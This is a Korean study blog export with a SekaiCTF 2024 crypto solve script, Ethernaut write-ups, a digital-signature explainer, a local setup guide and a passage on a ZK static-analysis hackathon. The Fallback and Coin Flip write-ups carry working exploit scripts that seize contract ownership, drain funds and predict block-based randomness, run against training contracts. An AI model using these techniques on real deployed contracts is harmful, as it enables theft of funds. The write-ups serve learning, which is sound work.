{"CTF/Sekai2024-some-trick-writeup":{"title":"Sometrick writeup","links":[],"tags":["CTF","Review"],"content":"SekaiCTF2024\n👾 Some Trick\n이번 대회에서 가장 쉬운 난이도로 출제된 Crypto 문제이다. 문제 코드는 아래와 같다.\nimport random\nfrom secrets import randbelow, randbits\nfrom flag import FLAG\n \nCIPHER_SUITE = randbelow(2**256)\nprint(f&quot;oPUN_SASS_SASS_l version 4.0.{CIPHER_SUITE}&quot;)\nrandom.seed(CIPHER_SUITE)\n \nGSIZE = 8209\nGNUM = 79\n \nLIM = GSIZE**GNUM\n \n \ndef gen(n):\n    p, i = [0] * n, 0\n    for j in random.sample(range(1, n), n - 1):\n        p[i], i = j, j\n    return tuple(p)\n \n \ndef gexp(g, e):\n    res = tuple(g)\n    while e:\n        if e &amp; 1:\n            res = tuple(res[i] for i in g)\n        e &gt;&gt;= 1\n        g = tuple(g[i] for i in g)\n    return res\n \n \ndef enc(k, m, G):\n    if not G:\n        return m\n    mod = len(G[0])\n    return gexp(G[0], k % mod)[m % mod] + enc(k // mod, m // mod, G[1:]) * mod\n \n \ndef inverse(perm):\n    res = list(perm)\n    for i, v in enumerate(perm):\n        res[v] = i\n    return res\n \n \nG = [gen(GSIZE) for i in range(GNUM)]\n \n \nFLAG = int.from_bytes(FLAG, &#039;big&#039;)\nleft_pad = randbits(randbelow(LIM.bit_length() - FLAG.bit_length()))\nFLAG = (FLAG &lt;&lt; left_pad.bit_length()) + left_pad\nFLAG = (randbits(randbelow(LIM.bit_length() - FLAG.bit_length()))\n        &lt;&lt; FLAG.bit_length()) + FLAG\n \nbob_key = randbelow(LIM)\nbob_encr = enc(FLAG, bob_key, G)\nprint(&quot;bob says&quot;, bob_encr)\nalice_key = randbelow(LIM)\nalice_encr = enc(bob_encr, alice_key, G)\nprint(&quot;alice says&quot;, alice_encr)\nbob_decr = enc(alice_encr, bob_key, [inverse(i) for i in G])\nprint(&quot;bob says&quot;, bob_decr)\n🕶️ 문제 분석\nFLAG에 적당한 padding 을 붙이는 것으로 시작한다. 자세히 보면 앞 뒤로 같은 길이의 패딩을 붙이고 가운데에 FLAG가 그대로 남아있는 형태다.\n이후 enc() 함수와 랜덤으로 생성한 bob_key, alice_key를 이용해서 FLAG 값으로부터 아래 세 값을 생성한다.\n\nbob_encr\nalice_encr\nbob_decr\n\nenc() 함수의 세 번째 파라미터인 G 는 순열(permutation)을 원소로 갖는 집합이다.\n문제 코드의 GNUM = 79와 GSIZE = 8209를 참고하면 아래와 같이 정리된다.\n\\begin{align}\nG &amp;= \\{G_0, G_1, \\dots, G_{78}\\} \\newline\nG_t &amp;= \\{g_0, g_1, \\dots, g_{8208}\\} \\; \\text{where} \\; (0 \\le t \\le 78, g_i \\in \\mathbb{Z}_{8209})\n\\end{align}\n💡 풀이 아이디어\n\n대회에서 제공한 Write-up을 읽으면서 문제 풀이 방법을 분석 중입니다.\n\n(1) G 복원\n우선 5~7번 라인의 CIPHER_SUITE를 획득할 수 있음을 이용해야 한다.\npython 에서 random 함수의 seed를 알 수 있다면 동일한 random value를 얻을 수 있기 때문이다.\n\n따라서, G 를 완전히 복원할 수 있다.\n(2) inverse operation\n이제 남은 것은 enc()함수의 역연산 가능 여부를 확인해야 한다.\nenc()함수를 다시 한번 적어보면 아래와 같다.\ndef enc(k, m, G):\n    if not G:\n        return m\n    mod = len(G[0])\n    return gexp(G[0], k % mod)[m % mod] + enc(k // mod, m // mod, G[1:]) * mod\nG_t 가 존재하지 않을 경우(비어있을 경우)에는 m을 반환하고, 이외에는 재귀적으로 enc()를 호출하고 있음을 알 수 있다. enc() 함수를 수식으로 풀어서 적으면 아래와 같다.\n\\begin{align}\n\\text{enc}(k, m, \\{G_0, G_1, \\dots, G_n\\}) = &amp;\\text{gexp}(G_0, k \\bmod 8209)[m\\bmod8209]\\newline  \n&amp;+ \\text{enc}(\\frac{k}{8209}, \\frac{m}{8209}, \\{G_1, G_2, \\dots, G_n\\}) \\times 8209\\newline\n\\end{align}\n이를 한 줄로 적으면 아래와 같다.\n\\begin{align}\n\\therefore \\text{enc}(k, m, \\{G_0, \\dots, G_n\\}) = \\sum_{i=0}^n\\text{gexp}(G_i, \\frac{k}{(8209)^i} \\bmod 8209)[\\frac{m \\bmod 8209}{(8209)^i}] \\times (8209)^i\n\\end{align}\n참고로 gexp()함수는 아래와 같은데, G_t 를 반복적으로 permutate 하는 함수이다.\n즉, G_t 의 원소 순서만 섞어주는 함수로 이해하면 된다.\ndef gexp(g, e):\n    res = tuple(g)\n    while e:\n        if e &amp; 1:\n            res = tuple(res[i] for i in g)\n        e &gt;&gt;= 1\n        g = tuple(g[i] for i in g)\n        print(&quot;[+]&quot;, g)\n        input(&quot;&quot;)\n    return res\n \n단순히 순서를 뒤바꾸는 작업이므로 gexp() 의 역연산을 구하는 것은 간단하다.\n식 (5)의 우항의 아래 식을 다음과 같이 생각할 수 있다.\n\\text{gexp}(G_i, \\frac{k}{(8209)^i} \\bmod 8209)[\\frac{m \\bmod 8209}{(8209)^i}] \\times (8209)^i\n\ngexp()를 거친 수의 집합 G_t 에서 \\frac{m}{(8209)^i} (\\bmod 8209) 번째 수를 선택하고 (8209)^i 만큼 곱한다.\n\n이러한 연산에 대한 역연산을 구하면 될 것이다…\n⚙️ dec() 함수 만들기\nenc(k, m, G)함수를 다시 적어보면 아래와 같다.\n\nG_i를 \\frac{k}{(8209)^i} 만큼 뒤섞고(gexp) \\frac{m}{(8209)^i} 번째 수를 뽑은 뒤 (8209)^i 를 곱한 수들의 합을 구하는 함수\n\n\\text{enc}(k, m, \\{G_0, \\dots, G_n\\}) = \\sum_{i=0}^n\\text{gexp}(G_i, \\frac{k}{(8209)^i} \\bmod 8209)[\\frac{m \\bmod 8209}{(8209)^i}] \\times (8209)^i\n덧셈으로 이어지는 각 항은 결국 (8209)^i로 구분되는 독립항으로 이해할 수 있다.\n따라서, 각 항의 연산 중 핵심이 되는 “숫자로부터 index 찾기”를 “index로부터 숫자 찾기”로 역연산하기만 하면 된다.\n이를 python의 list.index()로 할 수 있다.\n함수 dec(k, ct, G)를 완성하면 아래와 같다.\ndef dec(k, ct, G):\n    if not G:\n        return 0\n    mod = len(G[0])\n    return list(gexp(G[0],k % mod)).index(ct % mod) + dec(k // mod, ct // mod, G[1:]) * mod\n \n\\text{dec}(k, ct, \\{G_0, \\dots, G_n\\}) = \n\\sum_{i=0}^n(\\text{gexp}(G_i, \\frac{k}{(8209)^i} \\bmod 8209)[\\frac{ct \\bmod 8209}{(8209)^i}])^{-1} \\times (8209)^i\n🎯 풀이 과정\n🔑 bob_key 구하기\n문제 파일에서 bob_key를 사용하는 부분은 아래와 같다.\nbob_key = randbelow(LIM)\nbob_encr = enc(FLAG, bob_key, G)\nprint(&quot;bob says&quot;, bob_encr)\n \n# ...\n \nbob_decr = enc(alice_encr, bob_key, [inverse(i) for i in G])\nprint(&quot;bob says&quot;, bob_decr)\n첫 번째는 FLAG를 암호화 할 때 쓰이고, 다음은 bob_decr을 만들 때 사용한다.\n자연스럽게 dec()함수를 작성해서 bob_key를 알아내고, 이를 이용해 bob_encr로부터 FLAG를 알아내면 될 것이라 예상할 수 있다.\n아래 그림은 bob_key가 사용되는 과정을 표시해 보았다. 함수와 관련된 데이터는 두 종류로 구분된다.\n\n빨강: 현재 알 수 없는 데이터\n파랑: 이미 알고 있는 데이터\n\n\n이 때 주의할 점은 위 그림의 (2)에서 사용할 dec_1() 함수와 (1)에서 사용할 dec_2() 함수가 서로 다르다는 점이다. 그림에서도 알 수 있듯이 key와 FLAG는 각각 파라미터의 위치가 다르기 때문에 함수도 적절히 수정해서 사용해야 한다.\n# key recovery\ndef dec1(k, ct, G):\n    if not G:\n        return 0\n    mod = len(G[0])\n    enc_ = ct % mod\n    return solve1(G[0],k % mod, enc_) + dec1(k // mod, ct // mod, G[1:]) * mod\n# decrypt ciphertext\ndef dec2(ct, m, G):\n    if not G:\n        return 0\n    mod = len(G[0])\n    enc_ = ct % mod\n    return solve2(G[0], m % mod, enc_) + dec2(ct // mod, m // mod, G[1:]) * mod\n아래는 전체 풀이 코드다.\n# from pwn import *\nimport random\nfrom tqdm import tqdm\nfrom Crypto.Util.number import *\n \nGSIZE = 8209\nGNUM = 79\nLIM = GSIZE**GNUM\n \ndef gen(n):\n    p, i = [0] * n, 0\n    for j in random.sample(range(1, n), n - 1):\n        p[i], i = j, j\n    return tuple(p)\n \ndef gmul(g,res):\n    return tuple(res[i] for i in g)\n \ndef gexp(g, e):\n    res = tuple(g)\n    while e:\n        if e &amp; 1:\n            res = tuple(res[i] for i in g)\n        e &gt;&gt;= 1\n        g = tuple(g[i] for i in g)\n    return res\n \ndef solve1(g,e, enc):\n    return list(gexp(g, e)).index(enc)\n \ndef solve2(g,m, enc):\n    res = tuple(g)\n    \n    for k in tqdm(range(GSIZE)):\n        if g[m] == enc:\n            break\n        g = gmul(g,res)\n    return k        \n \ndef enc(k, m, G):\n    if not G:\n        return m\n    mod = len(G[0])\n    return gexp(G[0], k % mod)[m % mod] + enc(k // mod, m // mod, G[1:]) * mod\n \ndef dec1(k, ct, G):\n    if not G:\n        return 0\n    mod = len(G[0])\n    enc_ = ct % mod\n    return solve1(G[0],k % mod, enc_) + dec1(k // mod, ct // mod, G[1:]) * mod\n \n \ndef dec2(ct, m, G):\n    if not G:\n        return 0\n    mod = len(G[0])\n    enc_ = ct % mod\n    return solve2(G[0], m % mod, enc_) + dec2(ct // mod, m // mod, G[1:]) * mod\n \ndef inverse(perm):\n    res = list(perm)\n    for i, v in enumerate(perm):\n        res[v] = i\n    return res\n \n \n# dummy data\nCIPHER_SUITE = 110591768297227245694497075029453123404757949656068778741944453447307514557341\nbob_encr =    1019955973091606344105974034536959850924221029536340863495490757266623622251639116575406599272379986504150815403294296903136024122720975669315974276419982334539242945812082775004047360956546317688825136509364533584200387334257007746565220068260899614989644890030285148343911852151206621514102132313767907733673\nalice_encr =  1240660982730025957175758244124923399048746872643870410721255945058668243552335827223593172627145131088501509555898392384088472634111784321259590911964321541215354892744828673243690220710495911725108988198450229978193717403514990761647743246013044350297875200868413162779571713661073187779151522561367421450872\nbob_decr =    259950988951200637161457069201401492001721963672458806676176664354990083485862450485298078515232656249237939730090701224274750329969454342545138292391584726883394883558284135928317645141496868238770669561449771267288946094727795428614693143377196155730991822071791666972919492764192583740581384680308575457001\n \n \nrandom.seed(CIPHER_SUITE)\nG = [gen(GSIZE) for i in range(GNUM)]\n \nG_inv = [inverse(i) for i in G]\n \nalice_key = dec1(bob_encr, alice_encr, G)\nprint(&quot;FIN1&quot;,alice_key)\n \nbob_key = dec1(alice_encr, bob_decr, G_inv)\nprint(&quot;FIN2&quot;,bob_key)\n \nFLAG = dec2(bob_encr, bob_key, G)\n \nprint(bin(FLAG)[2:].index(bin(bytes_to_long(b&quot;SEKAI{&quot;))[2:]))\n \nfor i in range(int(FLAG).bit_length()):\n    if long_to_bytes(FLAG &gt;&gt; i)[-1] == ord(&quot;}&quot;):\n        print(long_to_bytes(FLAG &gt;&gt; i))\n "},"Cryptography/Digital-Signature":{"title":"Digital Signature","links":["Cryptography/Hash-Function","Cryptography/Public-Key-Cryptography"],"tags":["Cryptography"],"content":"디지털 서명: 안전한 전자 문서의 보증\n디지털 세상이 점점 더 확장됨에 따라, 우리는 온라인에서 중요한 문서를 전송하거나 계약을 맺을 때 그 문서의 진위성을 보장받을 필요가 있습니다. 예를 들어, 누군가가 문서를 조작하지 않았다는 것을 어떻게 확신할 수 있을까요? 또는, 그 문서를 실제로 특정한 사람이 작성했음을 어떻게 증명할 수 있을까요? 바로 이때 등장하는 기술이 디지털 서명입니다. 이 글에서는 디지털 서명이 무엇인지, 어떻게 작동하는지, 그리고 일상에서 어떻게 사용되는지를 쉽게 설명해보겠습니다.\n\n1) 디지털 서명의 개념\n디지털 서명은 전자 문서나 메시지의 진위성과 무결성을 보장하는 일종의 전자 도장입니다. 일반적인 서명이 종이 위에 서명자의 손글씨로 이루어지듯, 디지털 서명은 전자적으로 이루어집니다. 디지털 서명은 두 가지 주요 기능을 수행합니다:\n\n진위성 확인: 문서가 실제로 특정 사람에 의해 작성되었음을 증명합니다.\n무결성 보장: 문서가 작성된 이후에 전혀 변경되지 않았음을 보장합니다.\n\n쉽게 말해, Alice가 문서에 남긴 디지털 서명은 아래의 내용을 확실히 보장합니다.\n\n“Alice가 문서를 작성 후 직접 서명을 남겼고, 이 문서의 내용은 전혀 변하지 않았다”\n\n\n2) 디지털 서명 생성 및 검증 과정\n이러한 디지털 서명이 어떻게 만들어지고 검증되는 것인지 알아보겠습니다.\n과정은 서명 생성과 서명 검증의 두 단계로 나뉩니다.\n서명 생성\n\n\n해시 함수 사용: 먼저, 작성된 문서의 내용을 고정된 길이의 데이터로 변환합니다. 이 과정에서 사용하는 것이 바로 해시 함수입니다. 해시 함수는 입력 데이터에 대해 매우 독특한 소위 “디지털 지문”을 만들어냅니다.\n\n\n개인 키로 암호화: 서명자는 이 해시 값을 자신의 개인 키를 사용하여 암호화합니다. 이 암호화된 해시 값이 바로 디지털 서명이 됩니다. 여기서 개인 키는 서명자만 알고 있는 비밀 키로, 외부에 유출되어서는 안 됩니다.\n\n\n서명 검증\n\n\n공개 키로 복호화: 문서를 받는 사람은 서명자의 공개 키를 사용하여 디지털 서명을 복호화합니다. 이때 공개 키는 누구나 볼 수 있으며, 이를 통해 서명자의 신원(진위성)을 확인할 수 있습니다.\n\n\n해시 값 비교: 문서의 내용을 같은 해시 함수로 다시 해싱하여 새로운 해시 값을 생성합니다. 이 해시 값이 복호화된 해시 값과 일치하면, 문서가 변조되지 않았음(무결성)을 확인할 수 있습니다.\n\n\n\n3) 디지털 서명의 동작 원리(수학적 원리)\n디지털 서명이 왜 안전한지 이해하려면, 수학적 원리를 간단히 살펴볼 필요가 있습니다. 이 부분에서는 복잡한 수학적 개념을 피하면서도 이해하기 쉽게 설명하겠습니다.\n해시 함수\n해시 함수는 입력 데이터를 고정된 길이의 “해시 값”으로 변환하는 함수입니다. 중요한 점은 아주 작은 입력의 변화도 완전히 다른 해시 값을 만들어낸다는 것입니다. 따라서 문서가 조금이라도 변경되면, 생성된 해시 값이 달라져서 문서가 변조되었음을 쉽게 알 수 있습니다.\n공개 키 암호화\n디지털 서명은 공개 키 암호화 기법을 사용합니다. 이는 두 개의 키, 즉 공개 키와 개인 키로 이루어져 있습니다. 개인 키로 암호화한 데이터는 오직 해당 개인 키에 상응하는 공개 키로만 복호화할 수 있습니다. 이는 수학적 난제를 이용하여 이루어지며, 예를 들어 RSA 알고리즘에서는 큰 소수를 곱한 결과로부터 원래 소수를 찾는 것이 매우 어렵다는 사실을 기반으로 합니다.\n이러한 수학적 기초 덕분에, 디지털 서명은 서명자가 아닌 다른 사람이 위조하거나 변경할 수 없습니다.\n\n4) 디지털 서명의 대표적인 예\n디지털 서명은 다양한 분야에서 사용되고 있으며, 그중 몇 가지 대표적인 예를 살펴보겠습니다.\n전자 계약\n기업 간 계약서나 법적 문서를 전자적으로 주고받을 때 디지털 서명이 사용됩니다. 이는 문서의 진위성을 보장하고, 추후에 문서가 변조되지 않았음을 증명할 수 있게 합니다.\n소프트웨어 배포\n소프트웨어 개발자는 자신이 만든 프로그램에 디지털 서명을 하여, 사용자에게 이 프로그램이 공식적으로 배포된 것이며 중간에 변조되지 않았음을 보장합니다. 예를 들어, 운영체제에서 설치 프로그램을 실행할 때 “이 프로그램이 신뢰할 수 있는 출처에서 왔는지”를 확인하는 과정에서 디지털 서명이 사용됩니다.\n전자 메일\n디지털 서명은 이메일을 전송할 때 사용되기도 합니다. 중요한 이메일에 디지털 서명을 첨부하면, 수신자는 이메일이 실제 발신자로부터 왔으며 내용이 변조되지 않았음을 확인할 수 있습니다.\n"},"Cryptography/Hash-Function":{"title":"Hash Function","links":[],"tags":["Cryptography","Algorithm"],"content":"(wip)"},"Cryptography/Public-Key-Cryptography":{"title":"Public Key Cryptography","links":[],"tags":["Cryptography","Mathematics","Algorithm"],"content":"(wip)"},"Data-Structure/bipartite-graph":{"title":"Bipartite Graph","links":[],"tags":["DataStructure"],"content":"(wip)"},"Ethernaut/Ethernaut(0x00),-Hello-Ethernaut":{"title":"Ethernaut(0x00), Hello Ethernaut","links":[],"tags":["Ethernaut","Write-up"],"content":"시키는대로 따라하면 되는 단계입니다.\n\n한때는 풀이를 와장창 적어보기도 했었습니다.. 마치 ‘다음에 푸시는 분들도 참고해보세요’하는 식으로 말이죠.\n물론 정답은 없겠습니다만, 이렇게 기록을 남기는 것은 내가 나중에 다시 봤을 때, 스스로 접근 방법을 기억할 수 있으면 좋겠다. 라는 마음으로 해나가는 것이 좋다고 생각합니다.\n본 문제는 ethernaut을 chrome browser에서 console창으로 푸는 연습을 시키는 것이 목표인 것 같습니다.\n소스코드를 제공하지 않는 문제를 interactive하게 풀어나가는 과정인데, 딱히 취약점을 이용해 푸는 문제는 아니기에 생각할만한 점은 없습니다.\n콘솔에 저렇게 로그를 찍어주는게 굉장히 매력적이긴합니다."},"Ethernaut/Ethernaut(0x01),-Fallback":{"title":"Ethernaut(0x01), Fallback","links":[],"tags":["Ethernaut","Write-up"],"content":"소스코드부터 살펴보겠습니다.\n이미지로 가져왔는데, 일일이 다 볼 필요는 없어서 그냥 전체 코드 양을 가늠하는 느낌으로 첨부해보았습니다.\n\n사실 receive(), fallback() 함수가 어떤 것인지 살펴보면 되는 문제입니다. 코드는 함수 이름들에서 알 수 있듯이, 누구나 Ether를 기여(contribute)할 수 있고.. 주인만 회수(withdraw)할 수 있는 기능을 보여주고 있습니다.\n문제의 목표는 withdraw()함수로 이 컨트랙트를 털어가는 것입니다.\n이를 위해 pwnable 문제에서 shell 따는 것처럼 owner = msg.sender; 가 일어나는 receive()함수를 호출하면 될 것임을 쉽게 알 수 있습니다.\n아무래도 공식문서를 보는게 제일 좋다고 생각합니다…  Solidity Docs, Fallback Function, 일단 문제 이름이 fallback이니 여기서는 fallback 함수를 살펴본 내용만 잠깐 메모해두겠습니다.\n\n\n\n주어진 function signature가 맞는 것이 없으면 execute 됨\ndata가 전혀 주어지지 않고 receive함수도 없으면 exeucte\n\n사실 이 부분은 좀 이해가 안갑니다.\n직접 이런 Tx 날려보면서 확인해보면 될 것 같습니다. 향후 기록으로 남겨보려 합니다.\n\n\n항상 data는 받지만, Ether를 받으려면 payable 명시\n\n그리고, warning 카드도 있어서 가져와봤습니다.\n\n\nreceive 함수가 없을 때 payable fallback 함수는 평범한 Ether 전송을 위해 execute 됨\n“interface confusion”으로부터 Ether 전송을 구분하기 위해서 두 종류의 함수를 항상 같이 구현하는 것이 권장됨.\n\n이 부분도 명확히 이해하진 못한 것 같습니다.\nInterface Confusion에 관해서는 따로 공부해야 할 것 같네요.\n\n\n\n\n공식문서를 토대로 그냥 Ether를 보내면 receive를 호출할 수 있음을 알 수 있습니다.\n코드 상으로는 그 전에 contribute를 한번 해야 하니… foundry 연습도 할 겸 아래와 같이 간단한 스크립트를 작성해보았습니다.\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n \nimport {Script, console} from &quot;forge-std/Script.sol&quot;;\nimport {Fallback} from &quot;../src/EN_1_Fallback.sol&quot;;\n \ncontract EN_1 is Script {\n    Fallback public ctrt = Fallback(payable(0xc8CB5439c767A63aca1c01862252B2F3495fDcFE));\n \n    function run() public {\n        vm.startBroadcast(vm.envUint(&quot;PRIV_KEY&quot;));\n \n        address old_owner = ctrt.owner();\n \n        ctrt.contribute{value: 1 wei}();\n        address(ctrt).call{value: 1 wei}(&quot;&quot;);\n \n        address new_owner = ctrt.owner();\n \n        console.log(old_owner);\n        console.log(new_owner);\n \n        ctrt.withdraw();\n \n        vm.stopBroadcast();\n    }\n}\n사실 사이즈가 작은 exploit 코드일 것 같아서, 일단 cast 명령어로 풀어보는 데에 성공했었습니다.\n아래와 같은 방식으로 두 줄 더 입력하고 나니 성공했었습니다.\n cast send 0x7ab4C4804197531f7ed6A6bc0f0781f706ff7953 &quot;contribute()&quot; --rpc-url http://127.0.0.1:8545 --private-key 0x**************************************************************** --value 1wei\n어쨋든.. 스크립트를 실행해보면 아래 Logs 와 같이 Owner의 주소가 바뀐 것을 확인할 수 있습니다.\n\n\n\n여담\n사실 localnet으로 위 스크립트를 입력해보았는데, 뭐가 자꾸 안되는 겁니다… 특히 EvmError: NotActivated 라는 에러가 계속 떠서 좀 힘들었습니다.\n내가 어디를 빼먹었나 몇 번 점검해보아도 안나오길래 구글링을 좀 했더니 해결법을 찾았습니다. evm_version을 foundry.toml에 명시하지 않아 발생하는 에러라고 하는데, 정말 아래와 같이 추가해주니 해결되었습니다.\nevm_version=&quot;shanghai&quot;\n혹시나 하는 마음에 Ethernaut 레포로 가보니 evm_version을 명시하고 있었습니다…\n\n삽질은 끝나지 않네요… -_-;; 또 하나 배워가는 것 같습니다."},"Ethernaut/Ethernaut(0x02),-Fal1out":{"title":"Ethernaut(0x02), Fal1out","links":[],"tags":["Ethernaut","Write-up"],"content":"문제에 나와있듯이 ownership 을 획득하면 되는 문제입니다.\n사실 코드를 좀 살펴보면, ***Factory.sol 에 풀이 완료 조건이 있긴 합니다.\n\ninstance.owner() 와 현재 player 가 동일하다면 통과하는 로직입니다.\nowner 를 바꾸는 로직은 문제에서 /*constructor*/로 주석을 남긴 함수가 바로 보입니다.\n심지어 public으로 되어있으니 그냥 호출하면 되겠죠?\n솔리디티 공부했는지 검사하는 문제였습니다.\n좀 더 정확히는 constructor 함수에 대한 내용, public, external 등 지시자에 대한 내용을 살펴보게 만드는 문제라 생각합니다~\n\n\n여담\nfoundry 에서 solc 버전이 다를 경우 어떻게 해결을 해야 하나.. 좀 고민이었는데, 큰 문제는 없었습니다.\nFallout 문제가 사용하는 0.6.x 버전의 SafeMath 경우에도 그냥 레포에 가져왔더니 쉽게 해결됐습니다 ^_^;;\n\nParseError 가 많이 신경쓰이긴 하지만 뭐.. 좀 참거나 다른 방법을 찾아야 할 것 같습니다 -_-;;"},"Ethernaut/Ethernaut(0x03),-Coin-Flip":{"title":"Ethernaut(0x03), Coin Flip","links":[],"tags":["Ethernaut","Write-up"],"content":"Random인 척 하는 값을 이용한다고도 볼 수 있고.. Random을 구현하기 힘듦을 나타내는 것이라고도 할 수 있고.. 아무튼 그런 문제입니다.\n\n초 심플한 문제입니다. flip() 함수 하나만 있는데, 플레이어가 할 일은 _guess 값을 제대로 넣는 것 밖에 없습니다.\n솔직히 script 짜기 귀찮지만, 연습삼아 해보기로 했습니다.\n아래 문서 등을 참고하며 짰습니다.\n\nFoundry, getBlockNumber\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n \nimport {Script, console} from &quot;forge-std/Script.sol&quot;;\nimport {CoinFlip} from &quot;../src/EN_3_CoinFlip.sol&quot;;\n \ncontract EN_3 is Script {\n    CoinFlip public ctrt = CoinFlip(payable(0x06B1D212B8da92b83AF328De5eef4E211Da02097));\n \n \n    function run() public {\n        uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n \n        vm.startBroadcast(vm.envUint(&quot;PRIV_KEY&quot;));\n        uint blockValue = uint(blockhash(vm.getBlockNumber() - 1));\n        console.log(vm.getBlockNumber());\n        console.log(block.number);\n \n        uint coinflip = blockValue / FACTOR;\n        bool guess = coinflip == 1 ? true : false;\n        ctrt.flip(guess);\n \n        console.log(&quot;Win count:&quot;, ctrt.consecutiveWins());\n        vm.stopBroadcast();\n    }\n}\n문제의 로직을 그대로 들고와서 똑같이 계산해주면 되는 문제입니다.\non-chain data를 기반으로 random value를 생성하는건 하면 안되는 문제입니다.\n\n여담\n10번 반복해야 하는 문제라서, for 를 넣으면 쉽게 해결되지 않을까 생각했는데, 스크립트 실행 한 번이 Tx 한 번을 날리는 것 같습니다. (같은 block.number를 계속 사용합니다)"},"Ethernaut/Ethernaut,-로컬-풀이-환경구축":{"title":"Ethernaut, 로컬 풀이 환경구축","links":[],"tags":["Ethernaut","Write-up"],"content":"Openzeppelin이 호스팅하고 있는 Ethernaut에서 문제를 직접 풀 수도 있겠지만, testnet인 sepolia를 이용해야 하므로 faucet을 통해 ETH를 받아와야 합니다.\nFaucet을 통하는 과정이 번거롭기도 하고, testnet이다보니 블록 생성까지 기다려야 하는 등 아무래도 문제 풀이에 불편함이 많습니다.\nAnvil을 이용해서 localnet에 똑같은 환경을 구축하면 이러한 불편함을 덜 수 있습니다.\n상세하게 적을 필요는 없을 것 같고… 아래 순서대로 구축해두면 됩니다.\n\nAnvil 로 localnet 환경을 만들어 둡니다.\nEthernaut github Ethernaut 레포를 clone 해와서 Running locally 를 참고합니다.\n\n\npackage.json 에서 적절한 script 를 찾아서 입력해주면 됩니다. 저는 아래와 같이 입력해두었습니다.\n    yarn compile:contracts\n    yarn deploy:contracts\n    yarn start:ethernaut\n\n\n\nACTIVE_NETWORK를 위 그림과 같이 명시해두기도 했습니다. (그냥 주석 풀어주시면 됩니다…)\n\n\n\n\n그럼 아래와 같이 localhost:3000 에서 ethernatu을 푸는 환경을 만들 수 있습니다.\n\n저는 보통 localnet에서 기본적으로 제공하는 계정을 그냥 사용하는 편인데.. 다른 분의 블로그를 참조해보니 faucet으로 활용하고 본인 계정?에 가스비를 옮겨놓고 시작하는 방법도 꽤 괜찮은 것 같습니다.\nvelog.io/@oomia/%EB%A1%9C%EC%BB%AC%EC%97%90%EC%84%9C-%EC%8B%9C%EC%9E%91%ED%95%98%EB%8A%94-Ethernaut\n아무튼, 이제 한 문제씩 풀이를 정리해보겠습니다."},"Notes/16AUG,-PSE-Core-Program":{"title":"Simple ZK Static Program Analysis","links":[],"tags":["PSE_Core_Program","ZKP","Hackathon"],"content":"들어가며\n8월 16일 금요일의 PSE Core Program off-line meet 시간에는 ZKP 를 활용한 미니 해커톤이 진행되었다.\n나는 Orion 논문을 읽다가 발견했던 흥미로운 주제인 ZK Static Program Analysis 로 미니 해커톤에 참가했다. 결과물로 구현하고자 하는 것은 아래와 같다.\n\n임의의 Rust 프로그램 소스코드에 division by zero를 일으킬 수 있는 코드가 없음을 ZKP로 증명 하는 프로그램\n\nZKP 프로젝트인만큼 원본 소스코드에 관해서는 zero-knowledge인 것이 특징이다.\n안전한 소스코드 임을 직접 제출할 필요 없이도 증명할 수 있는 것이다.\nParser와 Circuit은 아래와 같이 설게 및 구현되었다.\n\nParser: Rust 코드를 분석해 Circuit의 입력값으로 변환하는 단계\nCircuit: 분석된 Rust코드를 통해 정적 분석을 수행하는 단계\n\n구현물은 github.com/c0np4nn4/simple_zk_spa 에서 확인할 수 있다.\n\n구현 상세\n1. Parser\nParser는 Rust 문법으로 작성된 소스코드를 읽고 각 줄을 분석하여 아래 형태의 배열로 변환한다.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n원소 1원소 2원소 3원소 4Op Type명령어 종류lhs elem좌항 원소rhs elem 1우항 원소 1rhs elem 2우항 원소 2\n아주 간단한 형태의 예시 프로그램 사용을 가정했기에 분석기도 매우 간결하게 구현하였다.\n명령어의 종류는 아래와 같이 총 4개로만 설계했다.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n명령어 번호명령어 종류명령어 설명0NoOp프로그램 종료를 의미하는 동작 코드 모든 배열의 원소가 0 ([0, 0, 0, 0])1Assign좌항 원소에 우항 원소 1을 저장 이 때, 우항 원소 2는 무조건 02Addition좌항 원소에 우항 원소 1과 우항 원소 2의 덧셈 결과를 저장3Division좌항 원소에 우항 원소 1과 우항 원소 2의 나눗셈 결과를 저장\n또, 변수(variable)와 값(value)를 아래와 같이 구분했다.\n\n변수는 모두 홀수로 표기한다.\n값은 모두 2를 곱한 값으로 배열 원소에 저장한다.\n\n1-1. Example\n아래와 같은 예제 소스 코드 example.rs가 있다고 해보자.\nfn main() {\n\tlet x: i64 = 7;\n\tlet y: i64 = -7;\n\tlet z: i64 = x + y;\n\tlet a: i64 = 4 / z;\n}\n각각의 줄은 다음과 같이 해석된다.\n{\n\t[1, 1,  14, 0], # [  &#039;assign&#039;,  &#039;x&#039;,  7 * 2,  nil]\n\t[1, 3, -14, 0], # [  &#039;assign&#039;,  &#039;y&#039;, -7 * 2,  nil]\n\t[2, 5,   1, 3], # [&#039;addition&#039;,  &#039;z&#039;,    &#039;x&#039;,  &#039;y&#039;]\n\t[3, 7,   8, 5]  # [&#039;division&#039;,  &#039;a&#039;,  4 * 2,  &#039;z&#039;]\n}\n값에 해당하는 7, -7, 4 는 모두 2배 곱해져서 배열로 정리되어 있음을 확인할 수 있다.\n\n2. Circuit\nParser는 단순하게 구현만 하면 됐지만, Circuit에서는 정적분석의 방법을 정하고 이를 구현해야 했다.\n이에 관해 “정적 분석은 계산 안하기 하는 것이라 생각할 수 있다.” 라는 조언을 바탕으로 아래와 같이 분석 방법을 정했다.\n\n양수인 값은 +로 둔다.\n음수인 값은 -로 둔다.\n덧셈의 피연산자에 관해 아래 세 가지 경우로 나뉠 수 있다.\n\n(양수) + (양수) = 양수, 즉 + 가 된다.\n(음수) + (음수) = 음수, 즉 -가 된다.\n(양수) + (음수) = ??\n\n\n\n양수와 음수를 더한 경우 결과를 T라고 두었으며, 이는 \\{+, -, 0\\} 중 하나이다.\ndivision by zero 는 나눗셈의 제수(분모)가 0일 때 발생한다.\n하지만,정확한 계산 수행없이 에러 발생의 가능성을 분석하기 위해서는 ‘제수가 T 인지’를 검사하는 것으로 충분하다.\n만약 검사하는 코드가 우주선이나 비행기에 들어가는 코드라고 생각해보자.\ndivision by zero 에러로 인해 프로그램이 정지하거나 문제를 일으키는 경우, 우주비행사 또는 비행기 탑승객들의 생명에 직접적인 영향을 끼칠 수 